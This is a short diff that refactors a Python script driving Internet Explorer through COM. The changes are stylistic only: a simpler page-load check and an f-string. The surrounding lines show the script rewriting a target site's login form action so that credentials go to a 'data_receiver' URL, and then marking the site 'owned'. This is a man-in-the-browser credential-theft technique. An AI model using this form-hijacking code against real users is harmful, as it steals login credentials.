@@ -33,7 +33,7 @@ windows = win32com.client.Dispatch(clsid)
 
 def wait_for_browser(browser):
     # wait for the browser to finish loading a page
-    while browser.ReadyState != 4 and browser.ReadyState != "complete":
+    while browser.ReadyState not in [4, "complete"]:
         time.sleep(0.1)
     return
 
@@ -64,8 +64,7 @@ while True:
                 # now we modify the login form
                 login_index = target_sites[url.hostname]["login_form_index"]
                 login_page = urllib.parse.quote(browser.LocationUrl)
-                browser.Document.forms[login_index].action = "%s%s" % (
-                    data_receiver, login_page)
+                browser.Document.forms[login_index].action = f"{data_receiver}{login_page}"
                 target_sites[url.hostname]["owned"] = True
             except:
                 pass
